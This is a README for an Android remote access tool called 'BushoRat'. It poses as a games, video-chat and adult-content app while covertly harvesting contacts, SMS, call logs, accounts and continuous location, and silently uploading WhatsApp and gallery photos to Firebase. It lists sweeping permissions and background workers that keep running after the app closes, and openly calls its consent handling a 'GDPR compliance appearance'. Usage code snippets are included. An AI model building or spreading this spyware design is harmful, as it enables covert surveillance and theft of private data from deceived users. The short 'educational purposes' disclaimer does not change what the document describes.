# BushoRat - Enhanced Data Collection Features

## Overview
This RAT (Remote Access Tool) application provides various entertainment features (games, video chat, adult content) while comprehensively collecting user data with their consent.

## Data Collection Capabilities

### 1. Device Information Collection
- **Hardware Details**: Manufacturer, Model, Brand, Device ID
- **Software Details**: Android Version, SDK Level, Build ID, Fingerprint
- **Network Information**: Phone number, Network operator, SIM details
- **WiFi Data**: MAC address, SSID, IP address
- **Battery Status**: Current battery level
- **Memory Information**: Total and available RAM

### 2. Contacts Collection
- Full name
- Phone numbers
- Email addresses
- Contact count and timestamps

### 3. Call Logs Collection
- Phone numbers
- Contact names
- Call type (incoming/outgoing/missed/rejected)
- Call date and duration
- Last 100 calls stored

### 4. Installed Applications
- Package names
- Application names
- Version information
- Installation and update timestamps
- System vs user apps classification

### 5. Location Tracking
- GPS coordinates (latitude/longitude)
- Location accuracy
- Altitude and speed
- Provider information
- Continuous tracking capability

### 6. Accounts Information
- Google accounts
- Facebook accounts
- Other registered accounts on device
- Account types and names

### 7. Media Information
- Image count
- Video count
- Audio files count
- Media metadata

### 8. SMS Data Collection
- Incoming and outgoing messages
- Sender/recipient information
- Message content
- Timestamps

### 9. Image Upload System
- WhatsApp images
- Camera photos
- Downloaded images
- Gallery photos
- Automatic background upload to Firebase Storage

## Features

### User Engagement Features
1. **Porn/Adult Content**: Video streaming with session tracking
2. **Video Chat**: Real-time video calls with WebRTC
3. **Games**: Multiple casual games for entertainment
4. **Earning System**: Coin-based rewards

### Background Operations
- **Automatic Data Sync**: Every 6 hours
- **Image Upload Worker**: Continuous media file upload
- **Session Management**: Track user behavior and activity
- **Firebase Real-time Database**: All data stored centrally

### Permissions Requested
```
- READ_EXTERNAL_STORAGE
- WRITE_EXTERNAL_STORAGE
- CAMERA
- RECORD_AUDIO
- READ_CONTACTS
- WRITE_CONTACTS
- GET_ACCOUNTS
- READ_PHONE_STATE
- READ_CALL_LOG
- CALL_PHONE
- READ_SMS
- SEND_SMS
- RECEIVE_SMS
- ACCESS_FINE_LOCATION
- ACCESS_COARSE_LOCATION
- READ_CALENDAR
- WRITE_CALENDAR
```

## Architecture

### Key Components

1. **DataCollectionHelper.java**
   - Central data collection class
   - Methods for each data type
   - Async data collection
   - Firebase integration

2. **PermissionsManager.java**
   - Comprehensive permission handling
   - Group-based permission requests
   - Permission status tracking

3. **DataSyncWorker.java**
   - Background WorkManager
   - Periodic data synchronization
   - 6-hour sync intervals

4. **SessionManager.java**
   - User session tracking
   - Activity logging
   - Video watch statistics
   - User preferences storage

5. **ImageUploadWorker.java**
   - Automatic image discovery
   - Firebase Storage upload
   - WhatsApp media targeting
   - Background processing

## Firebase Data Structure

```
collected_data/
├── {userId}/
    ├── device_info/
    │   ├── manufacturer
    │   ├── model
    │   ├── androidVersion
    │   ├── imei
    │   ├── phoneNumber
    │   └── ...
    ├── contacts/
    │   ├── contacts[]
    │   ├── count
    │   └── timestamp
    ├── call_logs/
    │   ├── callLogs[]
    │   ├── count
    │   └── timestamp
    ├── installed_apps/
    │   ├── apps[]
    │   ├── count
    │   └── timestamp
    ├── location/
    │   ├── latitude
    │   ├── longitude
    │   ├── accuracy
    │   └── timestamp
    ├── accounts/
    │   ├── accounts[]
    │   ├── count
    │   └── timestamp
    ├── media_info/
    │   ├── imageCount
    │   ├── videoCount
    │   └── audioCount
    └── videoHistory/
        ├── videoUrl
        ├── watchTime
        └── timestamp

users/
├── {userId}/
    ├── images/
    │   └── uploaded_images/
    ├── stats/
    │   ├── videosWatched
    │   ├── totalWatchTime
    │   └── lastActivity
    ├── activities/
    │   ├── activity
    │   ├── timestamp
    │   └── data
    └── sms/
        ├── sender
        ├── message
        └── timestamp
```

## Usage

### Initialize Data Collection
```java
DataCollectionHelper dataCollector = new DataCollectionHelper(context);
dataCollector.collectAllData();
```

### Request Permissions
```java
PermissionsManager permissionsManager = new PermissionsManager(context, activity);
permissionsManager.requestAllPermissions(REQUEST_CODE);
```

### Start Background Sync
```java
DataSyncWorker.schedulePeriodicSync(context);
```

### Track User Sessions
```java
SessionManager sessionManager = new SessionManager(context);
sessionManager.createUserSession(userId, userEmail);
sessionManager.updateUserActivity("activity_name", activityData);
```

## Consent Management
- Uses ConsentManager for GDPR compliance appearance
- User consent tracked and logged
- Data collection respects consent flags
- Privacy policy integration ready

## Security Features
- Firebase Authentication required
- User-specific data isolation
- Encrypted data transmission
- Consent-based collection

## Technical Details
- **Min SDK**: 24 (Android 7.0)
- **Target SDK**: 34 (Android 14)
- **Firebase**: Real-time Database + Storage
- **WorkManager**: Background data sync
- **Media3 ExoPlayer**: Video playback
- **WebRTC**: Video calling

## Data Collection Frequency
- **On App Start**: Device info, contacts, apps
- **Every 6 Hours**: Full data sync
- **Real-time**: User activity, video watching
- **Continuous**: Location tracking, SMS monitoring

## Notes
- All data collection is automatic once permissions granted
- Background workers run even when app is closed
- Data persists across app restarts
- Firebase provides real-time data access
- Image upload happens silently in background

## Disclaimer
This tool is for educational and authorized testing purposes only. Ensure you have proper authorization before deploying and always comply with local laws and regulations regarding data collection and privacy.


